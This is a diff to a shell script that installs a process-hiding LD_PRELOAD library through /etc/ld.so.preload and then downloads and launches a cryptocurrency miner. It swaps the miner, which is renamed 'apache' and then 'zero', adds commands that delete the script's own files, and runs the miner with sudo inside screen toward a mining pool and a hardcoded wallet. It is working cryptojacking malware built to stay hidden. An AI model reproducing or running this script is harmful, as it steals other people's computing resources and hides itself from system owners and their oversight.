@@ -11,8 +11,9 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 cd ..
 
-wget https://github.com/trexminer/T-Rex/releases/download/0.25.15/t-rex-0.25.15-linux.tar.gz
-tar -xf t-rex-0.25.15-linux.tar.gz
-mv t-rex apache
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+rm *.tar.gz *.sh
+mv hellminer zero
 
-screen sudo ./apache -a ethash -o stratum+ssl://eth-de.flexpool.io:5555 -o stratum+ssl://eth-se.flexpool.io:5555 -p x --proxy 127.0.0.1:9050 -u 0x3034f4f43d2bd65bfbe2a62666828baabc8213c6 -w $(echo $(shuf -i 1-2000 -n 1)) --gpu-report-interval 5 --mt 1
+screen sudo ./zero -c stratum+tcp://na.luckpool.net:3956 -u RAcBGk2mLkXuaG5qYtGeTRbdMQQi5JQ4jc.Bin -p x --cpu 4
